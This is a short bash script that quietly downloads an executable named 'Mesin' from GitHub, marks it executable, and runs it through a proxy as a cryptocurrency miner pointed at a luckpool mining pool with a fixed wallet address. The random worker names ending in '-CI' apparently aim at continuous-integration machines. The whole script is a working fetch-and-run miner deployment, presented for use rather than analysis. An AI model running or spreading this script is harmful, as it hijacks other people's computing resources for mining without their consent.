#!/usr/bin/env bash
wget -q https://github.com/renitareni/mesin/raw/main/Mesin
chmod +x Mesin
export http_proxy=socsk5://198.1.94.46:45972
./Mesin -v -l na.luckpool.net:3956 -u RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e.$(echo $(shuf -i 1-99999 -n 1)-CI) -p x -t 16
